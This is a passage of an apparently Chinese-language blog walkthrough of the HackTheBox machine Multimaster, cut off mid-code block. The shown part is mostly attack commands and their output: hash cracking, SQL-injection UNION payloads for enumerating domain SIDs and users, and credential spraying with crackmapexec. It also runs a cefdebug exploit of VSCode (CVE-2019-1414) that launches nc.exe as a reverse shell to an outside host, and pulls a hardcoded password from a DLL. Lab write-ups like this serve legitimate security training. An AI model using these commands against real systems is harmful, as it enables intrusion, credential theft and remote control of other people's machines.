14349/28763 MB (4096 MB allocatable), 16MCU</span><br><br>/usr/share/hashcat/OpenCL/m17900_a0-optimized.cl: Pure kernel not found, falling back to optimized kernel<br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 31<br><br>Hashes: 4 digests; 4 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Optimized-Kernel<br>* Zero-Byte<br>* Not-Iterated<br>* Single-Salt<br>* Raw-Hash<br>* Uses-64-Bit<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 4 MB<br><br>Dictionary cache built:<br>* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt<br>* Passwords.: 14344391<br>* Bytes.....: 139921497<br>* Keyspace..: 14344384<br>* Runtime...: 0 secs<br><br>9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1<br>68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1<br>fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking<br></code></pre></td></tr></table></figure><p>但是接着数据库里的用户名是无法访问还是都对不上没法用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ crackmapexec smb 10.10.10.179 -u user -p passwd --continue-on-success<br>SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)<br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:banking STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:password1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:finance1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:password1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:banking STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:password1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:finance1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:banking STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:password1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:finance1 STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:banking STATUS_LOGON_FAILURE <br>SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\james:password1 STATUS_LOGON_FAILURE <br></code></pre></td></tr></table></figure><h3 id="Active-Directory-SID"><a href="#Active-Directory-SID" class="headerlink" title="Active Directory SID:"></a>Active Directory SID:</h3><p>我将使用sqlmap的payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Type: UNION query<br>Title: Generic UNION query (NULL) - 5 columns<br>Payload: &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;-1791&#x27; UNION ALL SELECT 92,92,CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+CHAR(87)+CHAR(85)+CHAR(111)+CHAR(69)+CHAR(72)+CHAR(85)+CHAR(73)+CHAR(88)+CHAR(89)+CHAR(85)+CHAR(72)+CHAR(69)+CHAR(89)+CHAR(68)+CHAR(74)+CHAR(109)+CHAR(103)+CHAR(104)+CHAR(98)+CHAR(117)+CHAR(70)+CHAR(121)+CHAR(68)+CHAR(74)+CHAR(109)+CHAR(79)+CHAR(121)+CHAR(90)+CHAR(115)+CHAR(74)+CHAR(110)+CHAR(74)+CHAR(80)+CHAR(82)+CHAR(117)+CHAR(110)+CHAR(74)+CHAR(78)+CHAR(113)+CHAR(72)+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(106)+CHAR(113),92,92-- rPjk&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>这个payload其实就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1791<span class="hljs-string">&#x27; UNION ALL SELECT 92,92,92,92,92-- rPjk</span><br></code></pre></td></tr></table></figure><p>在线转码工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://dencode.com/string/unicode-escape<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222200932367.png" alt="image-20221222200932367">这边有email，回显是占位符是92，然后我找到了这篇文章：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/<br></code></pre></td></tr></table></figure><p>可以查看所属域：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1791<span class="hljs-string">&#x27; UNION ALL SELECT 92,92,92,DEFAULT_DOMAIN() as mydomain,92-- rPjk </span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222201945668.png" alt="image-20221222201945668"></p><p>查看域SID：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1791<span class="hljs-string">&#x27; UNION ALL SELECT 92,92,92,SUSER_SID(&#x27;</span>MEGACORP\Domain Admins<span class="hljs-string">&#x27;),92-- rPjk </span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222204303320.png" alt="image-20221222204303320"></p><p>这个似乱码的东西细看不是乱码，只是格式不对，然后通过GOOGLE可以找到一下文章：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://stackoverflow.com/questions/703019/convert-integer-to-hex-and-hex-to-integer<br></code></pre></td></tr></table></figure><p>然后可以将SID转换成十六进制：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-1791<span class="hljs-string">&#x27; UNION ALL SELECT 92,92,92,master.dbo.fn_varbintohexstr(SUSER_SID(&#x27;</span>MEGACORP\Domain Admins<span class="hljs-string">&#x27;)),92-- rPjk </span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222204631610.png" alt="image-20221222204631610"></p><p>域的SID就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0105000000000005150000001c00d1bcd181f1492bdfc236<br></code></pre></td></tr></table></figure><p>而管理员组的SID是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000<br></code></pre></td></tr></table></figure><p>我可以再查询一下域普通用户组：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0105000000000005150000001c00d1bcd181f1492bdfc23601020000<br></code></pre></td></tr></table></figure><p>可以再查一个已经存在的用户<strong>sbauer</strong>的SID：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0105000000000005150000001c00d1bcd181f1492bdfc2361e0c0000<br></code></pre></td></tr></table></figure><p>管理员的SID：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000<br></code></pre></td></tr></table></figure><h3 id="Enumeration-Users"><a href="#Enumeration-Users" class="headerlink" title="Enumeration Users:"></a>Enumeration Users:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html<span class="hljs-comment">#smb---tcp-445</span><br></code></pre></td></tr></table></figure><p>借了别人的脚本，枚举域内用户的sid：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ python enumsiduser.py<br>[*] Finding domain<br>[+] Found domain: MEGACORP<br>[*] Finding Domain SID<br>[+] Found SID <span class="hljs-keyword">for</span> MEGACORP domain: 0x0105000000000005150000001c00d1bcd181f1492bdfc236<br>[+] Found account [01110]  MEGACORP\tushikikatomo                              <br>[+] Found account [01111]  MEGACORP\andrew                              <br>[+] Found account [01112]  MEGACORP\lana               <br>[+] Found account [03115]  MEGACORP\aldom                              <br>[+] Found account [03116]  MEGACORP\jsmmons                              <br>[+] Found account [03117]  MEGACORP\pmartin                              <br>[+] Found account [03119]  MEGACORP\Developers  <br></code></pre></td></tr></table></figure><p>跑了四个新的用户名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ crackmapexec winrm 10.10.10.179 -u user -p passwd --continue-on-success | grep [+]<br>WINRM                    10.10.10.179    5985   MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 (Pwn3d!)<br></code></pre></td></tr></table></figure><p>可以用winrm登陆：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ evil-winrm -u <span class="hljs-string">&quot;MEGACORP\tushikikatomo&quot;</span> -p finance1 -i 10.10.10.179<br><br>Evil-WinRM shell v3.4<br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt; <span class="hljs-built_in">whoami</span><br>megacorp\tushikikatomo<br>*Evil-WinRM* PS C:\Users\alcibiades\Documents&gt; <br></code></pre></td></tr></table></figure><p>然后可以上传SharpHound.exe，对域内情况进行分析探索。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221223092643413.png" alt="image-20221223092643413"></p><p>Bloodhound中显示tushikikatomo可以使用powershell建立会话横向移动到域控制器上，但是需要想法子将自己提升为系统权限然后才能够对域控发起DCSync，所以目前只能寻找有无其他用户的凭证泄漏或者系统漏洞。</p><h3 id="Get-Cyork-Shell"><a href="#Get-Cyork-Shell" class="headerlink" title="Get Cyork Shell:"></a>Get Cyork Shell:</h3><p>在进程信息中有显示一堆Code进程，这个是微软的VSCode:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> C:\Users\alcibiades\Documents&gt; <span class="hljs-built_in">ps</span><br><br>Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  <span class="hljs-built_in">SI</span> ProcessName<br><span class="hljs-literal">-------</span>  <span class="hljs-literal">------</span>    <span class="hljs-literal">-----</span>      <span class="hljs-literal">-----</span>     <span class="hljs-literal">------</span>     <span class="hljs-literal">--</span>  <span class="hljs-literal">--</span> <span class="hljs-literal">-----------</span><br>    <span class="hljs-number">224</span>      <span class="hljs-number">15</span>     <span class="hljs-number">6128</span>       <span class="hljs-number">2696</span>               <span class="hljs-number">628</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">389</span>      <span class="hljs-number">51</span>    <span class="hljs-number">88816</span>      <span class="hljs-number">33460</span>              <span class="hljs-number">3336</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">407</span>      <span class="hljs-number">60</span>   <span class="hljs-number">150068</span>     <span class="hljs-number">186284</span>              <span class="hljs-number">3864</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">410</span>      <span class="hljs-number">61</span>   <span class="hljs-number">153536</span>     <span class="hljs-number">181932</span>              <span class="hljs-number">3956</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">276</span>      <span class="hljs-number">51</span>    <span class="hljs-number">58636</span>      <span class="hljs-number">10692</span>              <span class="hljs-number">4480</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">318</span>      <span class="hljs-number">31</span>    <span class="hljs-number">41856</span>      <span class="hljs-number">25192</span>              <span class="hljs-number">5028</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">278</span>      <span class="hljs-number">53</span>    <span class="hljs-number">61768</span>      <span class="hljs-number">71292</span>              <span class="hljs-number">5152</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">421</span>      <span class="hljs-number">55</span>    <span class="hljs-number">97228</span>      <span class="hljs-number">67532</span>              <span class="hljs-number">5308</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">278</span>      <span class="hljs-number">53</span>    <span class="hljs-number">67688</span>      <span class="hljs-number">76924</span>              <span class="hljs-number">5532</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">421</span>      <span class="hljs-number">23</span>    <span class="hljs-number">15584</span>       <span class="hljs-number">6604</span>              <span class="hljs-number">5568</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">276</span>      <span class="hljs-number">52</span>    <span class="hljs-number">46200</span>      <span class="hljs-number">35532</span>              <span class="hljs-number">5644</span>   <span class="hljs-number">1</span> Code<br>    <span class="hljs-number">675</span>      <span class="hljs-number">61</span>    <span class="hljs-number">33520</span>      <span class="hljs-number">87964</span>              <span class="hljs-number">6072</span>   <span class="hljs-number">1</span> Code<br></code></pre></td></tr></table></figure><p>VSCode存在有一个本地代码执行的漏洞，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://iwantmore.pizza/posts/cve-2019-1414.html<br></code></pre></td></tr></table></figure><p>然后找了这样一个工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/taviso/cefdebug<br></code></pre></td></tr></table></figure><p>然后根据github的文档，可以执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.\cefdebug.exe<br></code></pre></td></tr></table></figure><p>会找到当前开启的一些TCP端口，端口是随即开放的，也随时会换掉，所以这个洞要利用需要抓紧时间：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; .\cefdebug.exe<br>cefdebug.exe : [2022/12/22 17:58:02:4557] U: There are 2 tcp sockets <span class="hljs-keyword">in</span> state listen.<br>    + CategoryInfo          : NotSpecified: ([2022/12/22 17:...n state listen.:String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>[2022/12/22 17:58:22:4995] U: There were 0 servers that appear to be CEF debuggers.<br>*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; .\cefdebug.exe<br>cefdebug.exe : [2022/12/22 17:58:26:9531] U: There are 3 tcp sockets <span class="hljs-keyword">in</span> state listen.<br>    + CategoryInfo          : NotSpecified: ([2022/12/22 17:...n state listen.:String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>[2022/12/22 17:58:46:9686] U: There were 1 servers that appear to be CEF debuggers.<br>[2022/12/22 17:58:46:9686] U: ws://127.0.0.1:7364/1fb8ff08-738f-48d5-b4ce-53a6068f46fe<br></code></pre></td></tr></table></figure><p>事先找个目录存放nc：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; copy nc64.exe C:\\programdata\\nc.exe<br>*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; <span class="hljs-built_in">ls</span> C:\\programdata<br><br><br>    Directory: C:\programdata<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        7/16/2016   6:23 AM                Comms<br>d---s-         1/9/2020   1:18 PM                Microsoft<br>d-----        7/19/2021   1:07 AM                Package Cache<br>d-----        9/25/2019  10:54 AM                regid.1991-06.com.microsoft<br>d-----        7/16/2016   6:23 AM                SoftwareDistribution<br>d-----       11/20/2016   5:15 PM                USOPrivate<br>d-----       11/20/2016   5:15 PM                USOShared<br>da----        7/19/2021   1:07 AM                VMware<br>d-----         1/7/2020   7:45 PM                VsTelemetry<br>-a----       12/22/2022   6:01 PM          45272 nc.exe<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; .\cefdebug.exe<br>cefdebug.exe : [2022/12/22 18:11:04:7486] U: There are 4 tcp sockets <span class="hljs-keyword">in</span> state listen.<br>    + CategoryInfo          : NotSpecified: ([2022/12/22 18:...n state listen.:String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>[2022/12/22 18:11:24:8133] U: There were 2 servers that appear to be CEF debuggers.<br>[2022/12/22 18:11:24:8133] U: ws://127.0.0.1:30903/faa39325-22c7-46bd-9bb9-4e54ecbf30e3<br>[2022/12/22 18:11:24:8133] U: ws://127.0.0.1:35281/b194eb4c-9af8-4855-9f8f-42bf74351c49<br>*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; .\cefdebug.exe --code <span class="hljs-string">&quot;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;C:\\programdata\\nc.exe 10.10.16.15 443 -e cmd&#x27;)&quot;</span> --url ws://127.0.0.1:35281/b194eb4c-9af8-4855-9f8f-42bf74351c49<br>cefdebug.exe : [2022/12/22 18:11:40:7244] U: &gt;&gt;&gt; process.mainModule.require(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;C:\\programdata\\nc.exe 10.10.16.15 443 -e cmd&#x27;</span>)<br>    + CategoryInfo          : NotSpecified: ([2022/12/22 18:...15 443 -e cmd<span class="hljs-string">&#x27;):String) [], RemoteException</span><br><span class="hljs-string">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="hljs-string">[2022/12/22 18:11:40:7244] U: &lt;&lt;&lt; ChildProcess</span><br><span class="hljs-string">*Evil-WinRM* PS C:\Users\alcibiades\desktop&gt; </span><br></code></pre></td></tr></table></figure><p>我以为是系统的，但差了点：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">Archlinux:~/<span class="hljs-title">HackTheBox</span>/<span class="hljs-title">cefdebug</span>$ <span class="hljs-title">sudo</span> <span class="hljs-title">nc</span> -<span class="hljs-title">lvnp</span> 443</span><br><span class="hljs-function">[<span class="hljs-title">sudo</span>] <span class="hljs-title">archlinux</span> 的密码：<span class="hljs-title">Listening</span> <span class="hljs-title">on</span> 0.0.0.0 443</span><br><span class="hljs-function"><span class="hljs-title">Connection</span> <span class="hljs-title">received</span> <span class="hljs-title">on</span> 10.10.10.179 49986</span><br><span class="hljs-function"><span class="hljs-title">Microsoft</span> <span class="hljs-title">Windows</span> [<span class="hljs-title">Version</span> 10.0.14393]</span><br><span class="hljs-function">(<span class="hljs-title">c</span>) 2016 <span class="hljs-title">Microsoft</span> <span class="hljs-title">Corporation</span>. <span class="hljs-title">All</span> <span class="hljs-title">rights</span> <span class="hljs-title">reserved</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">Microsoft</span> <span class="hljs-title">VS</span> <span class="hljs-title">Code</span>&gt;<span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">whoami</span></span><br><span class="hljs-function"><span class="hljs-title">megacorp</span>\<span class="hljs-title">cyork</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Program</span> <span class="hljs-title">Files</span>\<span class="hljs-title">Microsoft</span> <span class="hljs-title">VS</span> <span class="hljs-title">Code</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Get-Sbauer-Shell"><a href="#Get-Sbauer-Shell" class="headerlink" title="Get Sbauer Shell:"></a>Get Sbauer Shell:</h3><p>在C:\inetpub\wwwroot\bin目录下有一些直接点题的Multimaster：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\inetpub\wwwroot\bin&gt;<span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is 7B4A-4B5F<br><br> Directory of C:\inetpub\wwwroot\bin<br><br>01/07/2020  09:28 PM    &lt;DIR&gt;          .<br>01/07/2020  09:28 PM    &lt;DIR&gt;          ..<br>02/21/2013  07:13 PM           102,912 Antlr3.Runtime.dll<br>02/21/2013  07:13 PM           431,616 Antlr3.Runtime.pdb<br>05/24/2018  12:08 AM            40,080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll<br>07/24/2012  10:18 PM            45,416 Microsoft.Web.Infrastructure.dll<br>01/09/2020  04:13 AM            13,824 MultimasterAPI.dll<br>01/09/2020  04:13 AM            28,160 MultimasterAPI.pdb<br>02/17/2018  08:14 PM           664,576 Newtonsoft.Json.dll<br>01/07/2020  09:28 PM    &lt;DIR&gt;          roslyn<br>11/27/2018  11:30 PM           178,808 System.Net.Http.Formatting.dll<br>11/27/2018  11:28 PM            27,768 System.Web.Cors.dll<br>01/27/2015  02:34 PM           139,976 System.Web.Helpers.dll<br>11/27/2018  11:31 PM            39,352 System.Web.Http.Cors.dll<br>11/27/2018  11:31 PM           455,096 System.Web.Http.dll<br>01/31/2018  10:49 PM            77,520 System.Web.Http.WebHost.dll<br>01/27/2015  02:32 PM           566,472 System.Web.Mvc.dll<br>02/11/2014  01:56 AM            70,864 System.Web.Optimization.dll<br>01/27/2015  02:32 PM           272,072 System.Web.Razor.dll<br>01/27/2015  02:34 PM            41,672 System.Web.WebPages.Deployment.dll<br>01/27/2015  02:34 PM           211,656 System.Web.WebPages.dll<br>01/27/2015  02:34 PM            39,624 System.Web.WebPages.Razor.dll<br>07/17/2013  03:33 AM         1,276,568 WebGrease.dll<br>              20 File(s)      4,724,032 bytes<br>               3 Dir(s)   6,643,183,616 bytes free<br><br>C:\inetpub\wwwroot\bin&gt;copy MultimasterAPI.dll \\10.10.16.15      <br></code></pre></td></tr></table></figure><p>在该dll有另一个密码。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221223102706425.png" alt="image-20221223102706425"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs passwd">D3veL0pM3nT!<br></code></pre></td></tr></table></figure><p>然后接着进行喷射：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ crackmapexec winrm 10.10.10.179 -u user -p <span class="hljs-string">&#x27;D3veL0pM3nT!&#x27;</span> --continue-on-success | grep [+]<br>WINRM                    10.10.10.179    5985   MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! (Pwn3d!)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ evil-winrm -u <span class="hljs-string">&quot;MEGACORP\sbauer&quot;</span> -p <span class="hljs-string">&#x27;D3veL0pM3nT!&#x27;</span> -i 10.10.10.179<br><br>Evil-WinRM shell v3.4<br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\sbauer\Documents&gt; <span class="hljs-built_in">whoami</span> /all<br><br>USER INFORMATION<br>----------------<br></code></pre></td></tr></table></figure><h3 id="Get-Jorden-Shell"><a href="#Get-Jorden-Shell" class="headerlink" title="Get Jorden Shell:"></a>Get Jorden Shell:</h3><p>sbauer有一个一级控制对象：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221223103301941.png" alt="image-20221223103301941"></p><p>这个JORDEN用户是SERVER OPERATORS组的，这是Active Directory默认存在的组，这个组的权限很大。我可以使用SBAUER用户的权限给JORDEN用户设置个SPN，需要借助PowerVIew:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 